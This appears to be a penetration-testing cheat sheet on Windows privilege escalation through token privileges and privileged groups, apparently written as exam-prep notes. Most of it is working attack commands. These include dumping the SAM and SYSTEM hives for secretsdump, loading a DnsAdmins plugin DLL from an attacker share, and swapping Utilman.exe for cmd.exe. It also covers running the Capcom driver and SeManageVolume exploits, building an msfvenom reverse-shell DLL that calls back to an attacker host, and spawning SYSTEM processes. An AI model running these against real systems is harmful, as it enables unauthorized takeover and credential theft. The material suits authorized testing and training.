# Privileged groups and token rights

```powershell
whoami /all
whoami /groups
whoami /priv
net localgroup
```
- Named rights may need enabling.

| Finding | Follow-up |
| --- | --- |
| `SeImpersonatePrivilege` / `SeAssignPrimaryTokenPrivilege` | [potato](potato.md) |
| Backup Operators / `SeBackupPrivilege` | Save SAM + SYSTEM (below) |
| DnsAdmins | DNS server plug-in DLL + service restart |
| Server Operators | Service config + restart rights |
| `SeDebugPrivilege` | Inspect LSASS / privileged processes → [credential-access](credential-access.md), [child of SYSTEM process](#sedebugprivilege) |
| `SeRestorePrivilege` | Write files/registry past ACLs → [SeRestore](#serestoreprivilege) |
| `SeTakeOwnershipPrivilege` | Own any object, then grant yourself rights → [SeTakeOwnership](#setakeownershipprivilege) |
| `SeLoadDriverPrivilege` | Load a vulnerable driver → [SeLoadDriver](#seloaddriverprivilege) |
| `SeManageVolumePrivilege` | Write access to the whole volume → [SeManageVolume](#semanagevolumeprivilege) |

## Backup right
```powershell
reg save HKLM\SAM C:\Temp\sam.save
reg save HKLM\SYSTEM C:\Temp\system.save
```
```bash
impacket-secretsdump -sam sam.save -system system.save LOCAL
```

## DnsAdmins / Server Operators
```cmd
dnscmd <DC-FQDN> /config /serverlevelplugindll \\<KALI>\share\plugin.dll
sc.exe \\<DC-FQDN> query dns
sc.exe qc <SERVICE>
```
- DnsAdmins: plug-in DLL + restart of the DNS service. Server Operators: exact service rights → [ad/privileged-groups](../ad/privileged-groups.md#server-operators).

## Disabled vs enabled
`whoami /priv` lists privileges the token holds; `Disabled` means present but not switched on. Many tools enable it themselves (`robocopy /b`, `takeown`, `reg save`); a script that calls the API directly may not.

```powershell
whoami /priv
```
- A privilege that is not listed at all cannot be enabled. UAC-filtered admin token: privileges often missing → [UAC](uac.md).
- Server Operators / Backup Operators group membership needs a fresh logon to show up in the token.

## SeBackupPrivilege: read any file
```cmd
robocopy /b C:\Users\Administrator\Desktop C:\Temp proof.txt
```
```powershell
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
Set-SeBackupPrivilege
Copy-FileSeBackupPrivilege C:\Users\Administrator\Desktop\proof.txt C:\Temp\proof.txt
```
- `/b` = backup mode (ignores file ACLs). Hive dump above covers SAM/SYSTEM; the DC's NTDS needs a snapshot → [ad/credential-access](../ad/credential-access.md).
- Reading `proof.txt` this way is not an interactive Administrator shell: it does not satisfy the proof rule ([exam checklist](../documentation/exam-checklist.md)).

## SeRestorePrivilege
Write or replace any file, registry key or ACL without the normal check. Replace something a SYSTEM process or a logon screen launches.

```cmd
copy /y C:\Windows\System32\Utilman.exe C:\Temp\Utilman.exe.bak
copy /y C:\Windows\System32\cmd.exe C:\Temp\Utilman.exe
robocopy /b C:\Temp C:\Windows\System32 Utilman.exe /is
```
- Trigger: lock screen / RDP sign-in screen → `Win+U` (Ease of Access) starts `Utilman.exe` as SYSTEM. Needs RDP or console.
- Other SYSTEM-run targets: a service binary or DLL → [service-binary-hijacking](service-binary-hijacking.md), [dll-hijacking](dll-hijacking.md).
- Restore the original afterwards: `robocopy /b C:\Temp C:\Windows\System32 Utilman.exe.bak` then rename back.

## SeTakeOwnershipPrivilege
```cmd
takeown /f C:\Windows\System32\Utilman.exe
icacls C:\Windows\System32\Utilman.exe /grant <USER>:F
copy /y C:\Windows\System32\Utilman.exe C:\Temp\Utilman.exe.bak
copy /y C:\Windows\System32\cmd.exe C:\Windows\System32\Utilman.exe
```
- Same trigger as above (lock screen `Win+U`). Ownership ≠ write access: the `icacls /grant` step is needed.
- Cleaner target: a service executable or config that a SYSTEM service uses → ownership, grant, replace, restart.
- Registry keys: ownership + `Set-Acl` works the same way (service `ImagePath`).
- Restore the backup copy and original ACL/owner (`icacls /setowner "NT SERVICE\TrustedInstaller"`) afterwards.

## SeLoadDriverPrivilege
Loads a signed-but-vulnerable kernel driver (e.g. Capcom.sys), then abuses its IOCTL for SYSTEM. Rare; newer Windows driver blocklists can stop it.

```cmd
EoPLoadDriver.exe System\CurrentControlSet\MyService C:\Temp\Capcom.sys
ExploitCapcom.exe
```
- Needs the privilege in an enabled state and an unprivileged registry path under `HKCU` (the tool handles it). Test on an identical build first: a crash blue-screens the box.

## SeManageVolumePrivilege
Public exploit changes the volume ACL so `Users` get write on `C:\`; then plant a DLL where a privileged process loads it.

```cmd
SeManageVolumeExploit.exe
icacls C:\Windows\System32\wbem
```
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<KALI> LPORT=443 -f dll -o tzres.dll
```
```cmd
copy C:\Windows\System32\wbem\tzres.dll C:\Temp\tzres.dll.bak
copy /y tzres.dll C:\Windows\System32\wbem\tzres.dll
systeminfo
```
- Often lands as a service account (NetworkService / LocalService) → `whoami /priv` → [potato](potato.md). Restore the original DLL.
- Any other writable-DLL path works: [dll-hijacking](dll-hijacking.md).

## SeDebugPrivilege
```powershell
. .\psgetsys.ps1
[MyProcess]::CreateProcessFromParent((Get-Process winlogon).Id, "C:\Windows\System32\cmd.exe", "")
```
- New process runs as SYSTEM (child of a SYSTEM process). The shell is on a different window station: use a reverse shell payload instead of `cmd.exe`.
- LSASS dump is the other route: [credential-access](credential-access.md#lsass).
